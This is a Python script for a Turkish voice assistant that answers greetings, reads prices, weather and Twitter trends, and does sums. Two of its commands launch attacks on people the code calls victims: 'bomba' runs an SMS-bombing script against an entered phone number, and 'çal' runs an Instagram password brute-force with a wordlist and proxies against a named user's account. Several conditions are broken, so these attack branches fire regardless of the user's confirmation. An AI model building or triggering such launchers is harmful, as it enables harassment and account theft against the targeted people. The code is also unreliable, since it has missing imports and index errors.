#!/usr/bin/env python
# -*- coding: utf-8 -*-
# NRB
import speech_recognition as sr
from playsound import playsound
from gtts import gTTS
import os
import random
import time
import socket
import sys
from time import sleep
from datetime import datetime
from bs4 import BeautifulSoup
import requests
import re
hello_world = ["Geceler bizden sorulur","Bu karanlıkta ne işin var","Yat uyu demiyecem. Hoşgeldin","İşlemcimi ısıtalım mı"]
def hour_hunter():
    hour = datetime.now().hour
    if 5 <= hour <13 :
        return "Günaydın"
    elif 13 <= hour < 18:
        return "Tünaydın"
    elif 18 <= hour < 21:
        return "Hoşgeldin"
    elif 21 <= hour < 5:
        return hello_world[random.randint(0,5)]
name = " en ar bi"
def record():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        audio = r.listen(source)
        voice = ""
        try:
            voice = r.recognize_google(audio, language="tr-TR")
        except sr.UnknownValueError:
            return "Anlayamadım"
        except sr.RequestError:
            print("Sistem çalışmıyor")
        return voice
def speak(string):
    tts = gTTS(string,lang="tr")
    rand = random.randint(1,1000)
    file = "audio-"+str(rand)+".mp3"
    tts.save(file)
    playsound(file)
    os.remove(file)
küfür=["Terbiyesiz herif","Boyundan utan","Yanında kimse yok herhalde","Siktir git","Bana diyeceğine kendine bak zaaa"]
def response(voice):
    if "nasılsın" in voice:
        speak("İyiyim sen nasılsın")
    if "Nasılsın" in voice:
        speak("İyiyim sen nasılsın")
    if "sistemi güncelle" in voice:
        speak("sistemi güncelliyorum")
        os.system("xterm -e apt-get update")
        speak("güncelleme bitti")
    if "sistemi kur" in voice:
        speak("sistemi kuruyorum")
        os.system("xterm -e apt-get upgrade")
        speak("sistem kurulumu bitti makina cayır cayır oldu")
    if "bekle" in voice:
        speak("Tamamdır")
        sleep(300)
        speak("Geldim"+name)
    if "kamera" in voice:
        face_scan()
    if "**" in voice:
        speak(küfür[random.randint(0,4)])
    if "WhatsApp'ı aç" in voice:
        speak("Whatsapp açılıyor")
        webbrowser.open("https://web.whatsapp.com/",new=0,autoraise=True)
    if "saat kaç" in voice:
        hour=datetime.now().hour
        minute=datetime.now().minute
        speak("saat {} {}".format(hour,minute))
    if "teşekkür ederim" in voice:
        speak("rica ederim ne demek")
    if "Teşekkür ederim" in voice:
        speak("rica ederim ne demek")
    if "Platon" in voice:
        speak("Seni dinliyorum")
    if "görüşürüz" in voice:
        speak("görüşürüz")
        exit()
    if "Görüşürüz" in voice:
        speak("görüşürüz")
        exit()
    if "işletim sistemi" in voice:
        if os.name == "nt":
            speak("İşletim sistemin windows")
        elif os.name == "posix":
            speak("İşletim sistemin linux")
    if "işletim sistemi" in voice:
        if os.name == "nt":
            speak("İşletim sistemin windows")
        elif os.name == "posix":
            speak("İşletim sistemin linux")
    if "bitcoin" in voice:
        try:
            print("Bitcoin")
            url = "https://www.haberturk.com/ekonomi/1-bitcoin-ne-kadar"
            responce = requests.get(url)
            html_icerigi = responce.content
            soup = BeautifulSoup(html_icerigi, "html.parser")
            for i in soup.find_all("div", {"class": "nko-result"}):
                print(i.text)
                speak("Bitcoin anlık olarak {}".format(i.text))
        except:
            speak("HATA OLUŞTU. Sorun internet bağlantısında olabilir.")
    if "Bitcoin" in voice:
        try:
            print("Bitcoin")
            url = "https://www.haberturk.com/ekonomi/1-bitcoin-ne-kadar"
            responce = requests.get(url)
            html_icerigi = responce.content
            soup = BeautifulSoup(html_icerigi, "html.parser")
            for i in soup.find_all("div", {"class": "nko-result"}):
                print(i.text)
                speak("Bitcoin anlık olarak {}".format(i.text))
        except:
            speak("HATA OLUŞTU. Sorun internet bağlantısında olabilir.")
    if "hava" in voice:
        url = "https://www.havadurumu15gunluk.xyz/havadurumu/424/diyarbakir-hava-durumu-15-gunluk.html"
        responce = requests.get(url)
        html_icerigi = responce.content
        soup = BeautifulSoup(html_icerigi, "html.parser")
        for i in soup.find_all("span", {"class": "temperature type-1"}):
            print(i.text)
            speak("Hava sıcaklığı {}".format(i.text))
    if "sıkıldım" in voice:
        AKSJHHDAKD = ["Evden çıkmaya ne dersin ?",
                      "Çetini aramaya ne dersin ?",
                      "Youtube'da videolar izyebilirsin."
                      ,"Aşıksınn sen arkadaş",
                      "Port taraması başlatabilrisin. Benim canım sıkılmaz ama sıkılsaydı öyle yapardım.",
        ]
        try:
            speak(AKSJHHDAKD[random.randint(0, 5)])
        except:
            speak("Can sıkıntısı kısmında bir hata oluştu. Kodlarıma bir göz atmanı isterim.")
    if "gündem" in voice:
        gündem = list()
        url = "https://www.twitter-trending.com/turkey/tr"
        responce = requests.get(url)
        html_icerigi = responce.content
        soup = BeautifulSoup(html_icerigi, "html.parser")
        for i in soup.find_all("span", {"class": "sire_kelime"}):
            print(i.text)
            print("**********************************")
            gündem.append(i.text)
        speak("Bugün twitter türkiye gündeminde {} {} {} {} {} başlıkları var.".format(gündem[0],
                                                                       gündem[1],
                                                                       gündem[2],
                                                                       gündem[3],
                                                                       gündem[4]))
    if "tarih" in voice:
        an = datetime.now()
        def ek():
            if an.month == 1 or an.month == 2 or an.month == 5 or an.month ==7 or  an.month == 8 or an.month ==11 or an.month ==12:
                return "inci"
            elif an.month == 3 or an.month == 4:
                return "üncü"
            elif an.month == 6:
                return "ıncı"
            elif an.month ==9 or an.month==10:
                "uncu"
        def ek2():
            try:
                if an.day == 1 or an.day == 2 or an.day == 5 or an.day == 7 or an.day == 8 or an.day == 11 or an.day == 12 or an.day == 15 or an.day == 17 or an.day == 18 or an.day == 20 or an.day == 21 or an.day == 22 or an.day == 25 or an.day == 27 or an.day == 28 or an.day == 31:
                    return "inci"
                elif an.day == 3 or an.day == 4 or an.day == 13 or an.day == 14 or an.day == 23 or an.day == 24:
                    return "üncü"
                elif an.day == 6 or an.day == 16 or an.day == 26:
                    return "ıncı"
                elif an.day == 9 or an.day == 10 or an.day == 19 or an.day == 29:
                    return "uncu"
            except:
                print("Tarih ayarlarında hata oluştu")
                speak("Hata. Hata. Hata")
        speak("Bugün yılın {} {} ayı, ve ayın {} {} günü".format(an.month,ek(),an.day,ek2()))
    if "söz" in voice:
        try:
            dKHkhb = list()
            gener = list()
            url = "https://www.milliyet.com.tr/galeri/atarli-sozler-2021-kisa-etkileyici-anlamli-giderli-laf-sokucu-kapak-sozler-6566492/3"
            responce = requests.get(url)
            html_icerigi = responce.content
            soup = BeautifulSoup(html_icerigi, "html.parser")
            for i in soup.find_all("h3", {"class": "description"}):
                Mitm = i.text
                Mitm2 = Mitm.split("-")
            speak("Günün sözü {}".format(list(filter(lambda word: len(word) > 6, Mitm2))[random.randint(0,5)]))


        except:
            speak("Hata")
            speak("Hata!")
    if "müzik aç" in voice:
        os.chdir("/root/Downloads")
        os.system("xterm -e mpg123 {}.mp3 > /dev/null 2>&1 &".format(random.randint(1,5)))
    if "bomba" in voice:
        speak("Mesaj bombası protokolünü hemen aktive ediyorum efendim.")
        sleep(3)
        speak("Protokolü sizin emriniz üzerine aktive ettim. Lütfen kurbanın alan kodunu ekrana giriniz.")
        afhGAUYSG = int(input("Alan Kodu('+' Koymayın):"))
        if afhGAUYSG == 90:
            speak("Girdiğiniz alan kodunun türkiye numarasına ait olduğunu hatırlatmak isterim.")
        elif afhGAUYSG == 1:
            speak("Girdiğiniz alan kodunun amerika numarasına ait olduğunu hatırlatmak isterim.")
        else:
            speak("Alan kodu kaydı alınmıştır.")
        speak("Sırada numaranın tamamı var. Ekrana numaranın kalan kısmını giriniz")
        dfhbg = int(input("Numara:"))
        speak("Tamamdır. İşlemi başlatmak üzereyim. Bundan sonrası bende efendim.")
        os.system("xterm -sh 250 -e python3 bomber.py --num 500 --country {} --timeout 20 {}".format(afhGAUYSG,dfhbg))
        speak("İşlem başlatıldı efendim.")
   #if "deneme" in voice: # Geliştirme aşamsında bırakılmıştır
       #url = "https://www.ihkib.org.tr/tr/dis-ticaret/ihracat/ulke-kodlari/k-283"
       #responce = requests.get(url)
       #html_icerigi = responce.content
       #soup = BeautifulSoup(html_icerigi, "html.parser")
       #for i in soup.find_all("div", {"class": "text-description"}):
           #qwe = i.text
           #tth = qwe.split()
    if "çıkar" in voice:
        speak("Tekrarlar mısın ?")
        try:
            list23 = list()
            x1 = record()
            x2 = x1.split()
            for i in x2:
                try:
                    sayi1 = int(i)
                    list23.append(i)
                except:
                    print("{} listeye eklenemedi".format(i))
            speak("{} ile {} farkı {} ediyor".format(list23[0], list23[1], int(list23[0]) - int(list23[1])))
        except:
            speak("{} ile {} farkı {} ediyor".format(list23[0], list23[1], int(list23[1]) - int(list23[0])))
    if "yanlış" in voice:
        speak("Ben yanlış yapmam çünkü özgür bir iradem yok")
    if "Yanlış" in voice:
        speak("Ben yanlış yapmam çünkü özgür bir iradem yok")
    
    if "uyku" in voice:
        speak("Uyku modu başlatıldı.")
        sayac = 0
        while True:
            KLNF = record()
            if KLNF == "Anlayamadım":
                sleep(1)
                sayac += 1
            else:
                speak("Günaydın")
                speak("Uykuda geçirdiğin süre {} saat {} dakika".format(int(sayac/3600),int((sayac%3600))))
                break

    if "siktir" in voice:
        speak("Yakışıyor mu böyle tabirler sana ?")
    if "topla" in voice:
        speak("Tekrarlar mısın ?")
        try:
            list23 = list()
            x1 = record()
            x2 = x1.split()
            for i in x2:
                try:
                    sayi1 = int(i)
                    list23.append(i)
                except:
                    print("{} listeye eklenemedi".format(i))
            speak("{} ile {} toplamı {} ediyor".format(list23[0], list23[1], int(list23[0]) + int(list23[1])))
        except:
            speak("Toplama işlemi yaparken bir sorun ile karşılaştım. Sorun sanırım verdiğiniz sayılarda olabilir.")
    if "çal" in voice:
        speak("İnstagram hesap çalma işlemi için öncelikle kurbanı tanımam gerekiyor. Lütfen bana kurbanın ismini söyler misin ?")
        target = record()
        speak("Kurbanın ismi {}. Onaylıyor musun ?".format(target))
        dfn = record()
        if dfn=="evet" or "onay":
            speak("Sırada kurbanın instagram kullanıcı adı var. Ekrana gelecek olan alana kullanıcı adı bilgisini yazınız.")
            sffkbhfjk = str(input("Kullanıcı Adı:"))
            speak("Birazdan işlemleri sırasıyla başlatacam bu sırada bir şeyler dinlemek ister misin ?")
            ghbs = record()
            if ghbs == "evet" or "dinlerim" or "olur" or "neden olmasın" or "güzel":
                webbrowser.open("https://www.youtube.com/watch?v=F80E4IhwdPM&list=RDCLAK5uy_n1j1GACZO4o7U1m708pa7jV1q7zR-cY44&start_radio=1&rv=e-k6zlHJxdI",new=0,autoraise=True)
                os.chdir("/opt/İnstagram-/")
                os.system("xterm -sh 250 -e python3 instagram.py -u {} -p {} -px proxies_lists.txt".format(sffkbhfjk,"passwords.txt"))
                speak("{} hesabına saldırıyı başlattım. Bitince telefonuna bilgilendirme mesajı atacağım.")
            else:
                os.chdir("/opt/İnstagram-/")
                os.system("xterm -sh 250 -e python3 instagram.py -u {} -p {} -px proxies_lists.txt".format(sffkbhfjk, "paswords.txt"))
                speak("{} hesabına saldırıyı başlattım. Bitince telefonuna bilgilendirme mesajı atacağım.")
        elif dfn == "Hayır":
            speak("İşlemi sizin talebiniz üzerine iptal ettim.")
    if "hasta" in voice:
        speak("Disk kartımda virüs yok yani hasta değilim")
speak("{} {}".format(hour_hunter(),name))
speak("Sana nasıl yardımcı olabilirim ?")
stop = ["Beklemedeyim","Burdayım","Bir yere mi gittin ?","Meşgul isen bekle diyebilirisin bana","Buralardayım","Bekleme moduna alarak tasarruf sağlayabilirsin"]
while True:
    for i in range(1,41):
        if i ==40:
            speak(stop[random.randint(0,5)])
        else:
            voice = record()
            print(voice)
            response(voice)
